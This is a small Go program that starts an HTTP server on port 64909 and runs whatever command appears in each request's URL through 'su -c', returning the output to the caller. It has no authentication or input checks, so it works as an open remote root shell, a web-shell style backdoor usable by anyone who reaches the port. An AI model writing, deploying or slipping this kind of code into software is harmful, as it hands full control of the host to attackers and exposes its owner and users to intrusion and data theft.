package main

import (
	"net/http"
	"os/exec"
	"log"
	 "net/url"
	"regexp"
)

func handler(w http.ResponseWriter, r *http.Request) {

	//get urlCommand from url request parameter
	urlCommand, err := url.QueryUnescape(r.RequestURI)
	reg, _ := regexp.Compile("\\/?\\??(.+)")
	commands := reg.FindStringSubmatch(urlCommand)

	//execute the command
	out, err := exec.Command("su", "-c", commands[1]).Output()

	if err != nil {
		log.Printf("Command finished with error: %v", err)
	}
	//write the result
	w.Write(out)
}

func main() {
	log.Print("Server is running")
	http.HandleFunc("/", handler)
	err := http.ListenAndServe(":64909", nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}

}
